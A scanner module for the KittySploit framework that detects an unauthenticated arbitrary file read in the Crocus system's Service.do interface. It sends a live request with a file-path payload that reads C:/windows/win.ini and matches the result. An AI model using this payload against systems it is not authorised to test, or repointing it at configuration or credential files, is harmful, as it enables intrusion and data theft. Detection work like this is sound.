#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is an arbitrary file reading vulnerability in the Service."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Crocus system Service.do - Arbitrary File Read Detection',
        'description': "There is an arbitrary file reading vulnerability in the Service.do interface of Ruiming Technology's Crocus system. An unauthenticated remote attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc. This leaves the website in an extremely unsafe state.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'crocus', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/wy876/POC/blob/main/%E9%94%90%E6%98%8E%E6%8A%80%E6%9C%AFCrocus%E7%B3%BB%E7%BB%9FService.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        path = '/Service.do?Action=Download&Path=C:/windows/win.ini'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'X-Requested-With': 'XMLHttpRequest'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Crocus system Service.do - Arbitrary File Read detected', path=path)
            return True
        return False

